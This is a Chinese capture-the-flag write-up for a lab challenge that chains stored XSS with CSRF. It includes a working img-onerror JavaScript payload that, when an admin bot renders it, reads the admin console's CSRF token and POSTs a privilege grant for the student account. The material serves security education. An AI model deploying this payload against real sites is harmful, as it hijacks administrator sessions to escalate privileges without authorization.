# 17-csrf-xss-combo

## 题目

- 账号：`student / student`

## 思路

首页提示很关键：

1. admin 机器人每 15 秒访问 `/board`。
2. 敏感接口是 `POST /admin/grant`。
3. CSRF token 在 `/admin/console` 页面里。
4. admin 给 `student` 授权后，`/profile` 能看到 flag。

所以利用链是：

```text
评论板存储型 XSS
  -> admin bot 访问 /board 触发 XSS
  -> XSS 用 admin 身份访问 /admin/console 读取 csrf_token
  -> XSS 用 admin 身份 POST /admin/grant 授权 student
  -> student 刷新 /profile 得到 flag
```

## 手工复刻

### 1. 登录

访问：

```text
http://目标地址/login
```

使用账号密码：

```text
student / student
```

### 2. 进入评论板

访问：

```text
http://目标地址/board
```

评论内容没有正确过滤 HTML，能形成存储型 XSS。

### 3. 提交 XSS Payload

在留言框提交：

```html
<img
  src="x"
  onerror="(async()=>{let h=await fetch('/admin/console',{credentials:'include'}).then(r=>r.text());let d=new DOMParser().parseFromString(h,'text/html');let t=d.querySelector('[name=csrf_token]')?.value||d.querySelector('#csrf_token')?.value||d.querySelector('#csrf_view')?.textContent;let p=new URLSearchParams();p.set('user','student');p.set('csrf_token',t);await fetch('/admin/grant',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:p});})()"
/>
```

解释一下这个 payload：

- `img src=x` 加载失败，会触发 `onerror`。
- admin bot 打开 `/board` 时，JS 在 admin 身份下执行。
- `fetch('/admin/console')` 读取管理员控制台页面。
- 从页面里取出 `csrf_token`。
- 再请求 `/admin/grant`，参数为：

```text
user=student
csrf_token=刚刚读到的 token
```

### 4. 等待 bot

admin bot 每 15 秒访问一次 `/board`，所以提交 payload 后等几秒到十几秒。

### 5. 刷新 Profile

访问：

```text
http://目标地址/profile
```

如果授权成功，可以看到：

```text
TOGOGO-flag{}
```
